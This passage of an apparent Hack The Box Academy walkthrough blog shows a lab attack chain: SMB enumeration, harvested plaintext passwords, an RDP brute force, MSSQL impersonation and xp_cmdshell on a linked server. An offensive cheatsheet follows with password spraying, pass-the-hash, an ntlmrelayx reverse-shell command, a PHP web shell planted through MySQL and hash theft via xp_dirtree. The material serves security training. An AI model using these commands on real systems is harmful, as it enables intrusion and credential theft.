</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2024-02-29T14:59:01
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2024-08-30T14:59:01
</span></span><span class=line><span class=cl><span class=p>|</span> rdp-ntlm-info:
</span></span><span class=line><span class=cl><span class=p>|</span>   Target_Name: WIN-HARD
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Domain_Name: WIN-HARD
</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS_Computer_Name: WIN-HARD
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Domain_Name: WIN-HARD
</span></span><span class=line><span class=cl><span class=p>|</span>   DNS_Computer_Name: WIN-HARD
</span></span><span class=line><span class=cl><span class=p>|</span>   Product_Version: 10.0.17763
</span></span><span class=line><span class=cl><span class=p>|</span>_  System_Time: 2024-03-01T15:00:45+00:00
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2024-03-01T15:01:24+00:00<span class=p>;</span> 0s from scanner time.
</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
</span></span><span class=line><span class=cl>OS fingerprint not ideal because: Timing level <span class=m>5</span> <span class=o>(</span>Insane<span class=o>)</span> used
</span></span><span class=line><span class=cl>No OS matches <span class=k>for</span> host
</span></span><span class=line><span class=cl>Network Distance: <span class=m>2</span> hops
</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time:
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2024-03-01T15:00:48
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode:
</span></span><span class=line><span class=cl><span class=p>|</span>   311:
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TRACEROUTE <span class=o>(</span>using port 445/tcp<span class=o>)</span>
</span></span><span class=line><span class=cl>HOP RTT     ADDRESS
</span></span><span class=line><span class=cl><span class=m>1</span>   8.64 ms 10.10.14.1
</span></span><span class=line><span class=cl><span class=m>2</span>   8.53 ms 10.129.203.10
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 53.51 seconds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ smbmap -u simon -H 10.129.203.10 -R Home
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Guest session    IP: 10.129.203.10:445 Name: 10.129.203.10
</span></span><span class=line><span class=cl>        Disk                                                   Permissions Comment
</span></span><span class=line><span class=cl> ----                                                   ----------- -------
</span></span><span class=line><span class=cl> Home                                               READ ONLY
</span></span><span class=line><span class=cl> .<span class=se>\H</span>ome<span class=se>\*</span>
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 22:18:21 <span class=m>2022</span> .
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 22:18:21 <span class=m>2022</span> ..
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Fri Apr <span class=m>22</span> 04:14:02 <span class=m>2022</span> HR
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 21:11:44 <span class=m>2022</span> IT
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Fri Apr <span class=m>22</span> 04:14:51 <span class=m>2022</span> OPS
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Fri Apr <span class=m>22</span> 04:15:29 <span class=m>2022</span> Projects
</span></span><span class=line><span class=cl> .<span class=se>\H</span>ome<span class=se>\I</span>T<span class=se>\*</span>
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 21:11:44 <span class=m>2022</span> .
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 21:11:44 <span class=m>2022</span> ..
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 21:11:53 <span class=m>2022</span> Fiona
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 22:15:09 <span class=m>2022</span> John
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 22:16:07 <span class=m>2022</span> Simon
</span></span><span class=line><span class=cl> .<span class=se>\H</span>ome<span class=se>\I</span>T<span class=se>\F</span>iona<span class=se>\*</span>
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 21:11:53 <span class=m>2022</span> .
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 21:11:53 <span class=m>2022</span> ..
</span></span><span class=line><span class=cl> fr--r--r--              <span class=m>118</span> Thu Apr <span class=m>21</span> 21:13:11 <span class=m>2022</span> creds.txt
</span></span><span class=line><span class=cl> .<span class=se>\H</span>ome<span class=se>\I</span>T<span class=se>\J</span>ohn<span class=se>\*</span>
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 22:15:09 <span class=m>2022</span> .
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 22:15:09 <span class=m>2022</span> ..
</span></span><span class=line><span class=cl> fr--r--r--              <span class=m>101</span> Thu Apr <span class=m>21</span> 22:14:58 <span class=m>2022</span> information.txt
</span></span><span class=line><span class=cl> fr--r--r--              <span class=m>164</span> Thu Apr <span class=m>21</span> 22:13:40 <span class=m>2022</span> notes.txt
</span></span><span class=line><span class=cl> fr--r--r--               <span class=m>99</span> Thu Apr <span class=m>21</span> 22:15:55 <span class=m>2022</span> secrets.txt
</span></span><span class=line><span class=cl> .<span class=se>\H</span>ome<span class=se>\I</span>T<span class=se>\S</span>imon<span class=se>\*</span>
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 22:16:07 <span class=m>2022</span> .
</span></span><span class=line><span class=cl> dr--r--r--                <span class=m>0</span> Thu Apr <span class=m>21</span> 22:16:07 <span class=m>2022</span> ..
</span></span><span class=line><span class=cl> fr--r--r--               <span class=m>94</span> Thu Apr <span class=m>21</span> 22:16:48 <span class=m>2022</span> random.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat 10.129.203.10-Home_IT_*
</span></span><span class=line><span class=cl>Windows Creds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>kAkd03SA@#!
</span></span><span class=line><span class=cl>48Ns72!bns74@S84NNNSl
</span></span><span class=line><span class=cl>SecurePassword!
</span></span><span class=line><span class=cl>Password123!
</span></span><span class=line><span class=cl>SecureLocationforPasswordsd123!!
</span></span><span class=line><span class=cl>Password Lists:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>1234567</span>
</span></span><span class=line><span class=cl><span class=o>(</span>DK02ka-dsaldS
</span></span><span class=line><span class=cl>Inlanefreight2022
</span></span><span class=line><span class=cl>Inlanefreight2022!
</span></span><span class=line><span class=cl>TestingDB123
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Credentials
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>k20ASD10934kadA
</span></span><span class=line><span class=cl>KDIlalsa9020$
</span></span><span class=line><span class=cl>JT9ads02lasSA@
</span></span><span class=line><span class=cl>Kaksd032klasdA#
</span></span><span class=line><span class=cl>LKads9kasd0-@
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cat smb_users.txt
</span></span><span class=line><span class=cl>simon
</span></span><span class=line><span class=cl>john
</span></span><span class=line><span class=cl>fiona
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ hydra rdp://10.129.203.10 -L smb_users.txt -P smb_passes.txt
</span></span><span class=line><span class=cl>Hydra v9.1 <span class=o>(</span>c<span class=o>)</span> <span class=m>2020</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak - Please <span class=k>do</span> not use in military or secret service organizations, or <span class=k>for</span> illegal purposes <span class=o>(</span>this is non-binding, these *** ignore laws and ethics anyway<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> starting at 2024-03-01 15:53:42
</span></span><span class=line><span class=cl><span class=o>[</span>WARNING<span class=o>]</span> rdp servers often dont like many connections, use -t <span class=m>1</span> or -t <span class=m>4</span> to reduce the number of parallel connections and -W <span class=m>1</span> or -W <span class=m>3</span> to <span class=nb>wait</span> between connection to allow the server to recover
</span></span><span class=line><span class=cl><span class=o>[</span>INFO<span class=o>]</span> Reduced number of tasks to <span class=m>4</span> <span class=o>(</span>rdp does not like many parallel connections<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>WARNING<span class=o>]</span> the rdp module is experimental. Please test, report - and <span class=k>if</span> possible, fix.
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>4</span> tasks per <span class=m>1</span> server, overall <span class=m>4</span> tasks, <span class=m>57</span> login tries <span class=o>(</span>l:3/p:19<span class=o>)</span>, ~15 tries per task
</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking rdp://10.129.203.10:3389/
</span></span><span class=line><span class=cl><span class=o>[</span>3389<span class=o>][</span>rdp<span class=o>]</span> host: 10.129.203.10   login: fiona   password: 48Ns72!bns74@S84NNNSl
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> freerdp: The connection failed to establish.
</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target successfully completed, <span class=m>1</span> valid password found
</span></span><span class=line><span class=cl><span class=o>[</span>WARNING<span class=o>]</span> Writing restore file because <span class=m>1</span> final worker threads did not <span class=nb>complete</span> <span class=k>until</span> end.
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> <span class=m>1</span> target did not resolve or could not be connected
</span></span><span class=line><span class=cl><span class=o>[</span>ERROR<span class=o>]</span> <span class=m>0</span> target did not <span class=nb>complete</span>
</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> finished at 2024-03-01 15:53:50
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>us-academy-2<span class=o>]</span>─<span class=o>[</span>10.10.14.179<span class=o>]</span>─<span class=o>[</span>htb-ac-713396@htb-mziude0vvw<span class=o>]</span>─<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ xfreerdp /u:fiona /p:<span class=s1>&#39;48Ns72!bns74@S84NNNSl&#39;</span> /v:10.129.203.10
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\F</span>iona&gt;sqlcmd
</span></span><span class=line><span class=cl>1&gt; SELECT SYSTEM_USER
</span></span><span class=line><span class=cl>2&gt; SELECT IS_SRVROLEMEMBER<span class=o>(</span><span class=s1>&#39;sysadmin&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>3&gt; go
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>WIN-HARD<span class=se>\F</span>iona
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>1</span> rows affected<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------
</span></span><span class=line><span class=cl>          <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>1</span> rows affected<span class=o>)</span>
</span></span><span class=line><span class=cl>1&gt; SELECT distinct b.name
</span></span><span class=line><span class=cl>2&gt; FROM sys.server_permissions a
</span></span><span class=line><span class=cl>3&gt; INNER JOIN sys.server_principals b
</span></span><span class=line><span class=cl>4&gt; ON a.grantor_principal_id <span class=o>=</span> b.principal_id
</span></span><span class=line><span class=cl>5&gt; WHERE a.permission_name <span class=o>=</span> <span class=s1>&#39;IMPERSONATE&#39;</span>
</span></span><span class=line><span class=cl>6&gt; GO
</span></span><span class=line><span class=cl>name
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>john
</span></span><span class=line><span class=cl>simon
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>2</span> rows affected<span class=o>)</span>
</span></span><span class=line><span class=cl>1&gt; EXECUTE AS <span class=nv>LOGIN</span> <span class=o>=</span> <span class=s1>&#39;john&#39;</span>
</span></span><span class=line><span class=cl>2&gt; SELECT SYSTEM_USER
</span></span><span class=line><span class=cl>3&gt; SELECT IS_SRVROLEMEMBER<span class=o>(</span><span class=s1>&#39;sysadmin&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>4&gt; GO
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>john
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>1</span> rows affected<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------
</span></span><span class=line><span class=cl>          <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>1</span> rows affected<span class=o>)</span>
</span></span><span class=line><span class=cl>1&gt;
</span></span><span class=line><span class=cl>1&gt; SELECT srvname, isremote FROM sysservers
</span></span><span class=line><span class=cl>2&gt; go
</span></span><span class=line><span class=cl>srvname                                                                                                                          isremote
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------------------------------------------------------- --------
</span></span><span class=line><span class=cl>WINSRV02<span class=se>\S</span>QLEXPRESS                                                                                                                     <span class=m>1</span>
</span></span><span class=line><span class=cl>LOCAL.TEST.LINKED.SRV                                                                                                                   <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>2</span> rows affected<span class=o>)</span>
</span></span><span class=line><span class=cl>1&gt; EXEC <span class=o>[</span>LOCAL.TEST.LINKED.SRV<span class=o>]</span>.master.dbo.sp_configure <span class=s1>&#39;show advanced options&#39;</span>, 1<span class=p>;</span>
</span></span><span class=line><span class=cl>2&gt; go
</span></span><span class=line><span class=cl>Configuration option <span class=s1>&#39;show advanced options&#39;</span> changed from <span class=m>0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span class=line><span class=cl>1&gt; EXEC <span class=o>(</span><span class=s1>&#39;RECONFIGURE&#39;</span><span class=o>)</span> AT <span class=o>[</span>LOCAL.TEST.LINKED.SRV<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>2&gt; go
</span></span><span class=line><span class=cl>1&gt; EXEC <span class=o>[</span>LOCAL.TEST.LINKED.SRV<span class=o>]</span>.master.dbo.sp_configure <span class=s1>&#39;xp_cmdshell&#39;</span>, 1<span class=p>;</span>
</span></span><span class=line><span class=cl>2&gt; go
</span></span><span class=line><span class=cl>Configuration option <span class=s1>&#39;xp_cmdshell&#39;</span> changed from <span class=m>0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span class=line><span class=cl>1&gt; EXEC <span class=o>(</span><span class=s1>&#39;RECONFIGURE&#39;</span><span class=o>)</span> AT <span class=o>[</span>LOCAL.TEST.LINKED.SRV<span class=o>]</span><span class=p>;</span>
</span></span><span class=line><span class=cl>2&gt; go
</span></span><span class=line><span class=cl>1&gt; EXEC <span class=o>(</span><span class=s1>&#39;xp_cmdshell &#39;&#39;type C:\\Users\\Administrator\\Desktop\\flag.txt&#39;&#39;&#39;</span><span class=o>)</span> AT <span class=o>[</span>LOCAL.TEST.LINKED.SRV<span class=o>]</span>
</span></span><span class=line><span class=cl>2&gt; go
</span></span><span class=line><span class=cl>output
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>HTB<span class=o>{</span>46u<span class=nv>$!</span>n9_l!nk3d_<span class=nv>$3</span>rv3r$<span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span><span class=m>1</span> rows affected<span class=o>)</span>
</span></span></code></pre></div><p><strong>flag:</strong> <code>HTB{46u$!n9_l!nk3d_$3rv3r$}</code></p><h3 id=cheatsheet-3>Cheatsheet<a hidden class=anchor aria-hidden=true href=#cheatsheet-3>#</a></h3><p><strong>Attacking FTP</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>ftp 192.168.2.142</code></td><td style=text-align:left>Connecting to the FTP server using the ftp client.</td></tr><tr><td style=text-align:left><code>nc -v 192.168.2.142 21</code></td><td style=text-align:left>Connecting to the FTP server using netcat.</td></tr><tr><td style=text-align:left><code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code></td><td style=text-align:left>Brute-forcing the FTP service.</td></tr></tbody></table><p><strong>Attacking SMB</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>smbclient -N -L //10.129.14.128</code></td><td style=text-align:left>Null-session testing against the SMB service.</td></tr><tr><td style=text-align:left><code>smbmap -H 10.129.14.128</code></td><td style=text-align:left>Network share enumeration using smbmap.</td></tr><tr><td style=text-align:left><code>smbmap -H 10.129.14.128 -r notes</code></td><td style=text-align:left>Recursive network share enumeration using smbmap.</td></tr><tr><td style=text-align:left><code>smbmap -H 10.129.14.128 --download "notes\note.txt"</code></td><td style=text-align:left>Download a specific file from the shared folder.</td></tr><tr><td style=text-align:left><code>smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"</code></td><td style=text-align:left>Upload a specific file to the shared folder.</td></tr><tr><td style=text-align:left><code>rpcclient -U'%' 10.10.110.17</code></td><td style=text-align:left>Null-session with the rpcclient.</td></tr><tr><td style=text-align:left><code>./enum4linux-ng.py 10.10.11.45 -A -C</code></td><td style=text-align:left>Automated enumeration of the SMB service using enum4linux-ng.</td></tr><tr><td style=text-align:left><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'</code></td><td style=text-align:left>Password spraying against different users from a list.</td></tr><tr><td style=text-align:left><code>impacket-psexec administrator:'Password123!'@10.10.110.17</code></td><td style=text-align:left>Connect to the SMB service using the impacket-psexec.</td></tr><tr><td style=text-align:left><code>crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec</code></td><td style=text-align:left>Execute a command over the SMB service using crackmapexec.</td></tr><tr><td style=text-align:left><code>crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users</code></td><td style=text-align:left>Enumerating Logged-on users.</td></tr><tr><td style=text-align:left><code>crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam</code></td><td style=text-align:left>Extract hashes from the SAM database.</td></tr><tr><td style=text-align:left><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></td><td style=text-align:left>Use the Pass-The-Hash technique to authenticate on the target host.</td></tr><tr><td style=text-align:left><code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></td><td style=text-align:left>Dump the SAM database using impacket-ntlmrelayx.</td></tr><tr><td style=text-align:left><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e &lt;base64 reverse shell></code></td><td style=text-align:left>Execute a PowerShell based reverse shell using impacket-ntlmrelayx.</td></tr></tbody></table><p><strong>Attacking SQL Databases</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>mysql -u julio -pPassword123 -h 10.129.20.13</code></td><td style=text-align:left>Connecting to the MySQL server.</td></tr><tr><td style=text-align:left><code>sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30</code></td><td style=text-align:left>Connecting to the MSSQL server.</td></tr><tr><td style=text-align:left><code>sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h</code></td><td style=text-align:left>Connecting to the MSSQL server from Linux.</td></tr><tr><td style=text-align:left><code>sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h</code></td><td style=text-align:left>Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server.</td></tr><tr><td style=text-align:left><code>mysql> SHOW DATABASES;</code></td><td style=text-align:left>Show all available databases in MySQL.</td></tr><tr><td style=text-align:left><code>mysql> USE htbusers;</code></td><td style=text-align:left>Select a specific database in MySQL.</td></tr><tr><td style=text-align:left><code>mysql> SHOW TABLES;</code></td><td style=text-align:left>Show all available tables in the selected database in MySQL.</td></tr><tr><td style=text-align:left><code>mysql> SELECT * FROM users;</code></td><td style=text-align:left>Select all available entries from the &ldquo;users&rdquo; table in MySQL.</td></tr><tr><td style=text-align:left><code>sqlcmd> SELECT name FROM master.dbo.sysdatabases</code></td><td style=text-align:left>Show all available databases in MSSQL.</td></tr><tr><td style=text-align:left><code>sqlcmd> USE htbusers</code></td><td style=text-align:left>Select a specific database in MSSQL.</td></tr><tr><td style=text-align:left><code>sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES</code></td><td style=text-align:left>Show all available tables in the selected database in MSSQL.</td></tr><tr><td style=text-align:left><code>sqlcmd> SELECT * FROM users</code></td><td style=text-align:left>Select all available entries from the &ldquo;users&rdquo; table in MSSQL.</td></tr><tr><td style=text-align:left><code>sqlcmd> EXECUTE sp_configure 'show advanced options', 1</code></td><td style=text-align:left>To allow advanced options to be changed.</td></tr><tr><td style=text-align:left><code>sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1</code></td><td style=text-align:left>To enable the xp_cmdshell.</td></tr><tr><td style=text-align:left><code>sqlcmd> RECONFIGURE</code></td><td style=text-align:left>To be used after each sp_configure command to apply the changes.</td></tr><tr><td style=text-align:left><code>sqlcmd> xp_cmdshell 'whoami'</code></td><td style=text-align:left>Execute a system command from MSSQL server.</td></tr><tr><td style=text-align:left><code>mysql> SELECT "&lt;?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'</code></td><td style=text-align:left>Create a file using MySQL.</td></tr><tr><td style=text-align:left><code>mysql> show variables like "secure_file_priv";</code></td><td style=text-align:left>Check if the secure file privileges are empty to read locally stored files on the system.</td></tr><tr><td style=text-align:left><code>sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents</code></td><td style=text-align:left>Read local files in MSSQL.</td></tr><tr><td style=text-align:left><code>mysql> select LOAD_FILE("/etc/passwd");</code></td><td style=text-align:left>Read local files in MySQL.</td></tr><tr><td style=text-align:left><code>sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'</code></td><td style=text-align:left>Hash stealing using the xp_dirtree command in MSSQL.</td></tr><tr><td style=text-align:left><code>sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'</code></td><td style=text-align:left>Hash stealing using the xp_subdirs command in MSSQL.</td></tr><tr><td style=text-align:left><code>sqlcmd> SELECT srvname, isremote FROM sysservers</code></td><td style=text-align:left>Identify linked servers in MSSQL.</td></tr><tr><td style=text-align:left><code>sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]</code></td><td style=text-align:left>Identify the user and its privileges used for the remote connection in MSSQL.</td></tr></tbody></table><p><strong>Attacking RDP</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'</code></td><td style=text-align:left>Password spraying against the RDP service.</td></tr><tr><td style=text-align:left><code>hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp</code></td><td style=text-align:left>Brute-forcing the RDP service.</td></tr><tr><td style=text-align:left><code>rdesktop -u admin -p password123 192.168.2.143</code></td><td style=text-align:left>Connect to the RDP service using rdesktop in Linux.</td></tr><tr><td style=text-align:left><code>tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}</code></td><td style=text-align:left>Impersonate a user without its password.</td></tr><tr><td style=text-align:left><code>net start sessionhijack</code></td><td style=text-align:left>Execute the RDP session hijack.</td></tr><tr><td style=text-align:left><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></td><td style=text-align:left>Enable &ldquo;Restricted Admin Mode&rdquo; on the target Windows host.</td></tr><tr><td style=text-align:left><code>xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA</code></td><td style=text-align:left>Use the Pass-The-Hash technique to login on the target host without a password.</td></tr></tbody></table><p><strong>Attacking DNS</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</code></td><td style=text-align:left>Perform an AXFR zone transfer attempt against a specific name server.</td></tr><tr><td style=text-align:left><code>subfinder -d inlanefreight.com -v</code></td><td style=text-align:left>Brute-forcing subdomains.</td></tr><tr><td style=text-align:left><code>host support.inlanefreight.com</code></td><td style=text-align:left>DNS lookup for the specified subdomain.</td></tr></tbody></table><p><strong>Attacking Email Services</strong></p><table><thead><tr><th style=text-align:left>Command</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>host -t MX microsoft.com</code></td><td style=text-align:left>DNS lookup for mail servers for the specified domain.</td></tr><tr><td style=text-align:left><code>dig mx inlanefreight.com | grep "MX" | grep -v ";"</code></td><td style=text-align:left>DNS lookup for mail servers for the specified domain.</td></tr><tr><td style=text-align:left><code>host -t A mail1.inlanefreight.htb.</code></td><td style=text-align:left>DNS lookup of the IPv4 address for the specified subdomain.</td></tr><tr><td style=text-align:left><code>telnet 10.10.110.20 25</code></td><td style=text-align:left>Connect to the SMTP server.</td></tr><tr><td style=text-align:left><code>smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7</code></td><td style=text-align:left>SMTP user enumeration using the RCPT command against the specified host.</td></tr><tr><td style=text-align:left><code>python3 o365spray.py --validate --domain msplaintext.xyz</code></td><td style=text-align:left>Verify the usage of Office365 for the specified domain.</td></tr><tr><td style=text-align:left><code>python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz</code></td><td style=text-align:left>Enumerate existing users using Office365 on the specified domain.</td></tr><tr><td style=text-align:left><code>python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz</code></td><td style=text-align:left>Password spraying against a list of users that use Office365 for the specified domain.</td></tr><tr><td style=text-align:left><code>hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3</code></td><td style=text-align:left>Brute-forcing the POP3 service.</td></tr><tr><td style=text-align:left><code>swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213</code></td><td style=text-align:left>Testing the SMTP service for the open-relay vulnerability.</td></tr></tbody></table><h3 id=complete-8>Complete<a hidden class=anchor aria-hidden=true href=#complete-8>#</a></h3><p><a href=https://academy.hackthebox.com/achievement/713396/116 title="Link of Completion" target=_blank rel="nofollow noopener">Link of Completion</a></p><h2 id=pivoting-tunneling-and-port-forwarding>Pivoting, Tunneling, and Port Forwarding<a hidden class=anchor aria-hidden=true 